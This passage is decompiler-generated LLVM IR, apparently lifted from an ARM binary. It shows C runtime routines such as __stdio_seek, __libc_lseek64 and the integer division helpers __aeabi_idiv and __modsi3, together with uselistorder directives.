  uselistorder i1 false, { 75, 41, 42, 43, 44, 45, 46, 47, 40, 13, 48, 28, 14, 29, 49, 50, 51, 16, 15, 8, 9, 52, 53, 54, 11, 17, 55, 30, 31, 56, 32, 33, 18, 36, 37, 4, 19, 57, 34, 35, 58, 59, 12, 20, 60, 61, 62, 38, 76, 0, 10, 63, 39, 64, 65, 66, 67, 68, 2, 1, 6, 7, 5, 69, 22, 70, 71, 72, 21, 73, 74, 25, 24, 26, 23, 27, 3, 77 }
  uselistorder i32 1073741824, { 2, 3, 0, 1 }
  uselistorder i32 20, { 0, 8, 9, 10, 18, 19, 5, 6, 11, 12, 13, 14, 20, 21, 22, 15, 23, 25, 3, 26, 1, 4, 16, 24, 17, 7, 2 }
  uselistorder i32 64, { 2, 3, 4, 7, 0, 5, 8, 9, 6, 10, 11, 12, 1 }
  uselistorder i32 44, { 3, 4, 0, 5, 6, 7, 8, 11, 1, 10, 9, 2 }
  uselistorder i32 40, { 3, 9, 4, 5, 6, 7, 8, 10, 11, 12, 1, 2, 0 }
  uselistorder i32 2048, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8 0, { 10, 59, 60, 36, 37, 62, 63, 61, 11, 12, 64, 65, 18, 25, 26, 66, 17, 22, 67, 68, 69, 19, 58, 71, 72, 73, 74, 70, 76, 75, 27, 77, 78, 28, 79, 42, 20, 80, 81, 13, 45, 85, 83, 44, 84, 82, 43, 38, 14, 15, 86, 87, 91, 92, 24, 56, 57, 88, 89, 90, 16, 93, 39, 46, 95, 0, 94, 47, 40, 96, 97, 98, 99, 100, 101, 23, 1, 2, 102, 103, 50, 107, 3, 105, 104, 48, 4, 106, 49, 5, 108, 109, 29, 6, 111, 110, 51, 112, 113, 41, 114, 115, 116, 117, 7, 118, 21, 30, 31, 32, 33, 34, 35, 120, 52, 121, 122, 119, 123, 124, 125, 126, 127, 128, 129, 130, 132, 131, 133, 8, 9, 135, 136, 134, 53, 137, 138, 55, 139, 54, 140, 141, 142, 143 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_11b24, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_11b30 = load i32, i32* @r4, align 4
  %v6_11b30 = load i32, i32* @lr, align 4
  %v1_11b34 = add i32 %arg1, 4
  %v2_11b34 = inttoptr i32 %v1_11b34 to i32*
  %v3_11b34 = load i32, i32* %v2_11b34, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_11b3c = load i32, i32* %arg2, align 4
  %v3_11b3c = add i32 %tmp, 4
  %v4_11b3c = inttoptr i32 %v3_11b3c to i32*
  %v5_11b3c = load i32, i32* %v4_11b3c, align 4
  %v6_11b40 = call i32 @__libc_lseek64(i32 %v3_11b34, i32 %v2_11b3c, i32 %v5_11b3c, i32 %arg3, i32 %v3_11b30, i32 %v6_11b30)
  %v1_11b44 = icmp slt i32 %v2_11b3c, 0
  %v6_11b40. = select i1 %v1_11b44, i32 %v6_11b40, i32 0
  store i32 %v6_11b40., i32* %r3.global-to-local, align 4
  br i1 %v1_11b44, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_11b50 = load i32, i32* @r4, align 4
  %v4_11b50 = inttoptr i32 %v3_11b50 to i32*
  store i32 %v6_11b40, i32* %v4_11b50, align 4
  %v6_11b50 = add i32 %v3_11b50, 4
  %v7_11b50 = inttoptr i32 %v6_11b50 to i32*
  store i32 %v2_11b3c, i32* %v7_11b50, align 4
  %v0_11b54.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v0_11b54 = phi i32 [ %v6_11b40, %entry ], [ %v0_11b54.pre, %bb ]
  ret i32 %v0_11b54

; uselistorder directives
  uselistorder i32 %v6_11b40, { 0, 2, 1 }
  uselistorder i32 %v2_11b3c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11ba0, label %dec_label_pc_11b8c

dec_label_pc_11b8c:                               ; preds = %entry
  %v0_11b8c = call i32 @__errno_location()
  %v0_11b90 = load i32, i32* %r4.global-to-local, align 4
  %v1_11b90 = sub i32 0, %v0_11b90
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_11b98 = inttoptr i32 %v0_11b8c to i32*
  store i32 %v1_11b90, i32* %v2_11b98, align 4
  %v0_11ba8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11ba8

dec_label_pc_11ba0:                               ; preds = %entry
  %v2_11ba0 = icmp eq i32 %arg1, 0
  br i1 %v2_11ba0, label %dec_label_pc_11bb4, label %dec_label_pc_11ba8

dec_label_pc_11ba8:                               ; preds = %dec_label_pc_11ba0, %dec_label_pc_11b8c
  %v0_11ba8 = phi i32 [ %arg1, %dec_label_pc_11ba0 ], [ %v0_11ba8.pre, %dec_label_pc_11b8c ]
  br label %dec_label_pc_11bb8

dec_label_pc_11bb4:                               ; preds = %dec_label_pc_11ba0
  br label %dec_label_pc_11bb8

dec_label_pc_11bb8:                               ; preds = %dec_label_pc_11ba8, %dec_label_pc_11bb4
  %v14_11bbc = phi i32 [ %v0_11ba8, %dec_label_pc_11ba8 ], [ %tmp9, %dec_label_pc_11bb4 ]
  ret i32 %v14_11bbc

; uselistorder directives
  uselistorder i32 ()* @__errno_location, { 58, 57, 56, 40, 55, 39, 54, 53, 28, 52, 14, 38, 51, 50, 49, 37, 13, 36, 35, 34, 27, 33, 45, 17, 10, 9, 8, 7, 6, 5, 4, 3, 59, 30, 29, 48, 47, 46, 26, 44, 32, 31, 21, 24, 23, 18, 19, 43, 16, 20, 42, 12, 15, 11, 25, 2, 41, 1, 0, 22 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11bb8, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_11bc0 = icmp slt i32 %arg2, 0
  %v2_11bc0 = icmp eq i32 %arg2, 0
  %v0_11bc4 = load i32, i32* @r0, align 4
  %v2_11bc4 = xor i32 %v0_11bc4, %arg2
  br i1 %v2_11bc0, label %dec_label_pc_11cd8, label %dec_label_pc_11bcc

dec_label_pc_11bcc:                               ; preds = %entry
  br i1 %v1_11bc0, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_11bcc
  %v2_11bcc = sub i32 0, %arg2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_11bcc, %bb
  %v1_11c98 = phi i32 [ %v2_11bcc, %bb ], [ %arg2, %dec_label_pc_11bcc ]
  %v1_11bd0 = add i32 %v1_11c98, -1
  %v7_11bd0 = icmp eq i32 %v1_11c98, 1
  br i1 %v7_11bd0, label %dec_label_pc_11c78, label %dec_label_pc_11bd8

dec_label_pc_11bd8:                               ; preds = %thread-pre-split
  %v1_11bd8 = icmp slt i32 %v0_11bc4, 0
  br i1 %v1_11bd8, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_11bd8
  %v2_11bdc = sub i32 0, %v0_11bc4
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_11bd8, %bb85
  %v0_11ccc = phi i32 [ %v0_11bc4, %dec_label_pc_11bd8 ], [ %v2_11bdc, %bb85 ]
  %v3_11be0 = icmp uge i32 %v0_11ccc, %v1_11c98
  %v9_11be0 = icmp eq i32 %v0_11ccc, %v1_11c98
  %v2_11be4 = xor i1 %v3_11be0, true
  %v3_11be4 = or i1 %v9_11be0, %v2_11be4
  br i1 %v3_11be4, label %dec_label_pc_11c84, label %dec_label_pc_11be8

dec_label_pc_11be8:                               ; preds = %bb86
  %v2_11be8 = and i32 %v1_11bd0, %v1_11c98
  %v4_11be8 = icmp eq i32 %v2_11be8, 0
  br i1 %v4_11be8, label %dec_label_pc_11c94, label %dec_label_pc_11bf0

dec_label_pc_11bf0:                               ; preds = %dec_label_pc_11be8
  %v3_11bf0 = icmp ult i32 %v1_11c98, 536870912
  br i1 %v3_11bf0, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_11bf0
  %v4_11bf4 = mul i32 %v1_11c98, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_11bf0, %.thread
  %v0_11c14.pr40.ph = phi i32 [ %v4_11bf4, %.thread ], [ %v1_11c98, %dec_label_pc_11bf0 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_11bf0 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_11c14.pr40 = phi i32 [ %v4_11c08, %bb89 ], [ %v0_11c14.pr40.ph, %.preheader.preheader ]
  %v1_11c0c = phi i32 [ %v4_11c0c, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_11c00 = icmp ugt i32 %v0_11c14.pr40, 268435455
  br i1 %v2_11c00, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_11c14thread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_11c04 = icmp ult i32 %v0_11c14.pr40, %v0_11ccc
  br i1 %v4_11c04, label %bb88, label %dec_label_pc_11c14thread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_11c08 = and i32 %v0_11c14.pr40, 268435456
  %v3_11c08 = icmp eq i32 %v2_11c08, 0
  %v4_11c08 = mul i32 %v0_11c14.pr40, 16
  br i1 %v3_11c08, label %bb89, label %dec_label_pc_11c14.loopexit

bb89:                                             ; preds = %bb88
  %v2_11c0c = and i32 %v1_11c0c, 268435456
  %v3_11c0c = icmp eq i32 %v2_11c0c, 0
  %v4_11c0c = mul i32 %v1_11c0c, 16
  br i1 %v3_11c0c, label %.preheader, label %dec_label_pc_11c14thread-pre-split.loopexit.loopexit

dec_label_pc_11c14thread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_11c2052.ph = phi i32 [ %v1_11c0c, %bb87 ], [ %v4_11c0c, %bb89 ]
  %v0_11c14.pr42.ph = phi i32 [ %v0_11c14.pr40, %bb87 ], [ %v4_11c08, %bb89 ]
  br label %dec_label_pc_11c14thread-pre-split.loopexit

dec_label_pc_11c14thread-pre-split.loopexit:      ; preds = %dec_label_pc_11c14thread-pre-split.loopexit.loopexit, %.thread3
  %v1_11c2052 = phi i32 [ %v1_11c0c, %.thread3 ], [ %v1_11c2052.ph, %dec_label_pc_11c14thread-pre-split.loopexit.loopexit ]
  %v0_11c14.pr42 = phi i32 [ %v0_11c14.pr40, %.thread3 ], [ %v0_11c14.pr42.ph, %dec_label_pc_11c14thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_11c14thread-pre-split

dec_label_pc_11c14thread-pre-split:               ; preds = %dec_label_pc_11c14thread-pre-split.loopexit, %bb91
  %v1_11c2050 = phi i32 [ %v1_11c2052, %dec_label_pc_11c14thread-pre-split.loopexit ], [ %v3_11c20, %bb91 ]
  %v2_11c1848 = phi i32 [ %v0_11ccc, %dec_label_pc_11c14thread-pre-split.loopexit ], [ %v2_11c18, %bb91 ]
  %v0_11c14.pr = phi i32 [ %v0_11c14.pr42, %dec_label_pc_11c14thread-pre-split.loopexit ], [ %v3_11c1c, %bb91 ]
  br label %dec_label_pc_11c14

dec_label_pc_11c14.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_11c14

dec_label_pc_11c14:                               ; preds = %dec_label_pc_11c14.loopexit, %dec_label_pc_11c14thread-pre-split
  %v1_11c20 = phi i32 [ %v1_11c2050, %dec_label_pc_11c14thread-pre-split ], [ %v1_11c0c, %dec_label_pc_11c14.loopexit ]
  %v2_11c18 = phi i32 [ %v2_11c1848, %dec_label_pc_11c14thread-pre-split ], [ %v0_11ccc, %dec_label_pc_11c14.loopexit ]
  %v1_11c1c = phi i32 [ %v0_11c14.pr, %dec_label_pc_11c14thread-pre-split ], [ %v4_11c08, %dec_label_pc_11c14.loopexit ]
  %v2_11c14 = icmp slt i32 %v1_11c1c, 0
  br i1 %v2_11c14, label %dec_label_pc_11c28, label %bb90

bb90:                                             ; preds = %dec_label_pc_11c14
  %v4_11c18 = icmp ult i32 %v1_11c1c, %v2_11c18
  br i1 %v4_11c18, label %bb91, label %dec_label_pc_11c28

bb91:                                             ; preds = %bb90
  %v3_11c1c = mul i32 %v1_11c1c, 2
  %v2_11c20 = icmp slt i32 %v1_11c20, 0
  %v3_11c20 = mul i32 %v1_11c20, 2
  br i1 %v2_11c20, label %dec_label_pc_11c28, label %dec_label_pc_11c14thread-pre-split

dec_label_pc_11c28:                               ; preds = %bb90, %dec_label_pc_11c14, %bb91
  %v2_11c3463 = phi i32 [ %v3_11c20, %bb91 ], [ %v1_11c20, %bb90 ], [ %v1_11c20, %dec_label_pc_11c14 ]
  %v1_11c2c55 = phi i32 [ %v3_11c1c, %bb91 ], [ %v1_11c1c, %bb90 ], [ %v1_11c1c, %dec_label_pc_11c14 ]
  br label %dec_label_pc_11c2c

dec_label_pc_11c2c:                               ; preds = %.thread13, %dec_label_pc_11c28
  %v1_11c60 = phi i32 [ %v4_11c60, %.thread13 ], [ %v2_11c3463, %dec_label_pc_11c28 ]
  %v1_11c34 = phi i32 [ %v1_11c70, %.thread13 ], [ 0, %dec_label_pc_11c28 ]
  %v1_11c64 = phi i32 [ %v4_11c64, %.thread13 ], [ %v1_11c2c55, %dec_label_pc_11c28 ]
  %v1_11c30 = phi i32 [ %v0_11c5c, %.thread13 ], [ %v0_11ccc, %dec_label_pc_11c28 ]
  %v3_11c2c = icmp ult i32 %v1_11c30, %v1_11c64
  br i1 %v3_11c2c, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_11c2c
  %v3_11c30 = sub i32 %v1_11c30, %v1_11c64
  %v3_11c34 = or i32 %v1_11c34, %v1_11c60
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_11c2c, %bb92
  %v1_11c3c = phi i32 [ %v1_11c30, %dec_label_pc_11c2c ], [ %v3_11c30, %bb92 ]
  %v1_11c40 = phi i32 [ %v1_11c34, %dec_label_pc_11c2c ], [ %v3_11c34, %bb92 ]
  %v4_11c38 = udiv i32 %v1_11c64, 2
  %v6_11c38 = icmp ult i32 %v1_11c3c, %v4_11c38
  br i1 %v6_11c38, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_11c3c = urem i32 %v1_11c64, 2
  %v4_11c3c = icmp eq i32 %v3_11c3c, 0
  %v6_11c3c = sub i32 %v1_11c3c, %v4_11c38
  br i1 %v4_11c3c, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_11c40 = udiv i32 %v1_11c60, 2
  %v6_11c40 = or i32 %v1_11c40, %v5_11c40
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_11c48 = phi i32 [ %v6_11c3c, %bb93 ], [ %v1_11c3c, %.thread8 ], [ %v6_11c3c, %bb94 ]
  %v1_11c4c = phi i32 [ %v1_11c40, %bb93 ], [ %v1_11c40, %.thread8 ], [ %v6_11c40, %bb94 ]
  %v4_11c44 = udiv i32 %v1_11c64, 4
  %v6_11c44 = icmp ult i32 %v1_11c48, %v4_11c44
  br i1 %v6_11c44, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_11c48 = and i32 %v1_11c64, 2
  %v4_11c48 = icmp eq i32 %v3_11c48, 0
  %v6_11c48 = sub i32 %v1_11c48, %v4_11c44
  br i1 %v4_11c48, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_11c4c = udiv i32 %v1_11c60, 4
  %v6_11c4c = or i32 %v1_11c4c, %v5_11c4c
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_11c54 = phi i32 [ %v6_11c48, %bb95 ], [ %v1_11c48, %.thread9 ], [ %v6_11c48, %bb96 ]
  %v1_11c58 = phi i32 [ %v1_11c4c, %bb95 ], [ %v1_11c4c, %.thread9 ], [ %v6_11c4c, %bb96 ]
  %v4_11c50 = udiv i32 %v1_11c64, 8
  %v6_11c50 = icmp ult i32 %v1_11c54, %v4_11c50
  br i1 %v6_11c50, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_11c54 = and i32 %v1_11c64, 4
  %v4_11c54 = icmp eq i32 %v3_11c54, 0
  %v6_11c54 = sub i32 %v1_11c54, %v4_11c50
  br i1 %v4_11c54, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_11c58 = udiv i32 %v1_11c60, 8
  %v6_11c58 = or i32 %v1_11c58, %v5_11c58
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_11c70 = phi i32 [ %v1_11c58, %bb97 ], [ %v1_11c58, %.thread10 ], [ %v6_11c58, %bb98 ]
  %v0_11c5c = phi i32 [ %v6_11c54, %bb97 ], [ %v1_11c54, %.thread10 ], [ %v6_11c54, %bb98 ]
  %v2_11c5c = icmp eq i32 %v0_11c5c, 0
  br i1 %v2_11c5c, label %dec_label_pc_11c6c, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_11c60, 16
  br i1 %tmp, label %dec_label_pc_11c6c, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_11c60 = udiv i32 %v1_11c60, 16
  %v4_11c64 = udiv i32 %v1_11c64, 16
  br label %dec_label_pc_11c2c

dec_label_pc_11c6c:                               ; preds = %thread-pre-split12, %bb99
  %v1_11c6c = icmp slt i32 %v2_11bc4, 0
  br i1 %v1_11c6c, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_11c6c
  %v2_11c70 = sub i32 0, %v1_11c70
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_11c78, %dec_label_pc_11c6c, %bb100
  %v1_11c74 = phi i32 [ %v1_11c70, %dec_label_pc_11c6c ], [ %v2_11c70, %bb100 ], [ %v0_11bc4, %dec_label_pc_11c78 ], [ %v2_11c7c, %bb101 ], [ %v1_11c9080, %bb103 ], [ %v2_11c8c, %bb104 ]
  ret i32 %v1_11c74

dec_label_pc_11c78:                               ; preds = %thread-pre-split
  br i1 %v1_11bc0, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_11c78
  %v2_11c7c = sub i32 0, %v0_11bc4
  br label %.thread16

dec_label_pc_11c84:                               ; preds = %bb86
  br i1 %v3_11be0, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_11c84
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_11c84, %bb102
  %v1_11c9080 = phi i32 [ %v0_11bc4, %dec_label_pc_11c84 ], [ 0, %bb102 ]
  br i1 %v9_11be0, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_11c88 = ashr i32 %v2_11bc4, 31
  %v2_11c8c = or i32 %v4_11c88, 1
  br label %.thread16

dec_label_pc_11c94:                               ; preds = %dec_label_pc_11be8
  %v2_11c94 = icmp ugt i32 %v1_11c98, 65535
  br i1 %v2_11c94, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_11c94
  %v2_11c98 = and i32 %v1_11c98, 32768
  %v3_11c98 = icmp eq i32 %v2_11c98, 0
  %v4_11c98 = udiv i32 %v1_11c98, 65536
  br i1 %v3_11c98, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_11c94
  %v0_11ca470 = phi i32 [ %v1_11c98, %dec_label_pc_11c94 ], [ %v4_11c98, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_11ca8 = phi i32 [ %v0_11ca470, %.thread19 ], [ %v4_11c98, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_11ca4 = icmp ugt i32 %v1_11ca8, 255
  br i1 %v2_11ca4, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_11ca8 = and i32 %v1_11ca8, 128
  %v3_11ca8 = icmp eq i32 %v2_11ca8, 0
  %v4_11ca8 = udiv i32 %v1_11ca8, 256
  br i1 %v3_11ca8, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_11cac = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_11cb8 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_11cac, %bb108 ]
  %v1_11cb4 = phi i32 [ %v1_11ca8, %bb106 ], [ %v4_11ca8, %bb107 ], [ %v4_11ca8, %bb108 ]
  %v2_11cb0 = icmp ugt i32 %v1_11cb4, 15
  br i1 %v2_11cb0, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_11cb4 = and i32 %v1_11cb4, 8
  %v3_11cb4 = icmp eq i32 %v2_11cb4, 0
  %v4_11cb4 = udiv i32 %v1_11cb4, 16
  br i1 %v3_11cb4, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_11cb8 = add nsw i32 %v1_11cb8, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_11cc0 = phi i32 [ %v1_11cb8, %.thread20 ], [ %v1_11cb8, %bb109 ], [ %v2_11cb8, %bb110 ]
  %v5_11cc4 = phi i32 [ %v1_11cb4, %.thread20 ], [ %v4_11cb4, %bb109 ], [ %v4_11cb4, %bb110 ]
  %v2_11cbc = icmp ugt i32 %v5_11cc4, 3
  %v7_11cbc = icmp eq i32 %v5_11cc4, 4
  %v2_11cc0 = xor i1 %v7_11cbc, true
  %v3_11cc0 = and i1 %v2_11cbc, %v2_11cc0
  br i1 %v3_11cc0, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_11cc0 = add nsw i32 %v4_11cc0, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_11cc4 = phi i32 [ %v4_11cc0, %.thread21 ], [ %v5_11cc0, %bb111 ]
  %v2_11cc4 = xor i1 %v2_11cbc, true
  %v3_11cc4 = or i1 %v7_11cbc, %v2_11cc4
  br i1 %v3_11cc4, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_11cc4 = udiv i32 %v5_11cc4, 2
  %v9_11cc4 = add i32 %v4_11cc4, %v8_11cc4
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_11ccc = phi i32 [ %v4_11cc4, %bb112 ], [ %v9_11cc4, %bb113 ]
  %v1_11cc8 = icmp slt i32 %v2_11bc4, 0
  %v6_11ccc = lshr i32 %v0_11ccc, %v1_11ccc
  %v2_11cd0 = sub i32 0, %v6_11ccc
  %v2_11cd0.v6_11ccc = select i1 %v1_11cc8, i32 %v2_11cd0, i32 %v6_11ccc
  ret i32 %v2_11cd0.v6_11ccc

dec_label_pc_11cd8:                               ; preds = %entry
  %v0_11cd8 = load i32, i32* @lr, align 4
  %v0_11cdc = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_11cd8)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_11cc4, { 1, 0 }
  uselistorder i1 %v7_11cbc, { 1, 0 }
  uselistorder i32 %v4_11cb4, { 1, 0 }
  uselistorder i32 %v1_11cb4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11ca8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_11ca8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11c98, { 1, 0 }
  uselistorder i32 %v0_11c5c, { 1, 0 }
  uselistorder i32 %v4_11c50, { 1, 0 }
  uselistorder i32 %v1_11c58, { 1, 2, 0 }
  uselistorder i32 %v4_11c44, { 1, 0 }
  uselistorder i32 %v1_11c4c, { 1, 2, 0 }
  uselistorder i32 %v4_11c38, { 1, 0 }
  uselistorder i32 %v1_11c40, { 1, 2, 0 }
  uselistorder i32 %v1_11c64, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_11c34, { 1, 0 }
  uselistorder i32 %v1_11c60, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_11c20, { 1, 0 }
  uselistorder i32 %v3_11c1c, { 1, 0 }
  uselistorder i32 %v1_11c1c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_11c18, { 1, 0 }
  uselistorder i32 %v1_11c20, { 1, 2, 0, 3 }
  uselistorder i32 %v4_11c0c, { 1, 0 }
  uselistorder i32 %v4_11c08, { 2, 1, 0 }
  uselistorder i32 %v1_11c0c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_11c14.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_11be0, { 1, 0 }
  uselistorder i32 %v1_11c98, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_11bc4, { 1, 0, 2 }
  uselistorder i32 %v0_11bc4, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 15, { 2, 3, 0, 1, 5, 4 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 120, 12, 121, 13, 122, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 117, 34, 35, 36, 37, 38, 123, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 124, 52, 57, 53, 54, 58, 55, 56, 59, 64, 60, 61, 63, 62, 65, 67, 66, 68, 69, 70, 0, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 118, 1, 101, 100, 99, 102, 103, 106, 105, 104, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 119 }
  uselistorder i32 128, { 11, 8, 18, 0, 14, 15, 1, 2, 9, 16, 17, 4, 13, 6, 7, 10, 5, 19, 20, 3, 12 }
  uselistorder i32 255, { 2, 5, 1, 4, 0, 3 }
  uselistorder i32 65536, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 21, 17, 22, 18, 23, 19, 24, 20, 25, 26, 27, 31, 28, 32, 29, 33, 30, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 32768, { 2, 0, 4, 1, 3 }
  uselistorder i32 65535, { 1, 0, 2 }
  uselistorder i32 31, { 12, 2, 8, 9, 10, 7, 0, 3, 5, 4, 6, 1, 11 }
  uselistorder i32 536870912, { 0, 2, 1 }
  uselistorder i1 true, { 0, 1, 2, 50, 48, 3, 4, 5, 6, 7, 8, 49, 9, 44, 12, 13, 10, 11, 14, 15, 16, 17, 45, 18, 19, 20, 21, 46, 47, 22, 23, 24, 25, 43, 51, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_11c6c, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_11c28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11c14thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_11cec = sdiv i32 %arg1, %arg2
  ret i32 %v2_11cec
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_11d00 = icmp eq i32 %arg2, 0
  br i1 %v2_11d00, label %dec_label_pc_11dd4, label %dec_label_pc_11d08

dec_label_pc_11d08:                               ; preds = %entry
  %v1_11d00 = icmp slt i32 %arg2, 0
  br i1 %v1_11d00, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_11d08
  %v2_11d08 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_11d08, %bb
  %v4_11d20 = phi i32 [ %arg2, %dec_label_pc_11d08 ], [ %v2_11d08, %bb ]
  %v0_11d0c = load i32, i32* @r0, align 4
  %v1_11d0c = icmp slt i32 %v0_11d0c, 0
  br i1 %v1_11d0c, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_11d10 = sub i32 0, %v0_11d0c
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
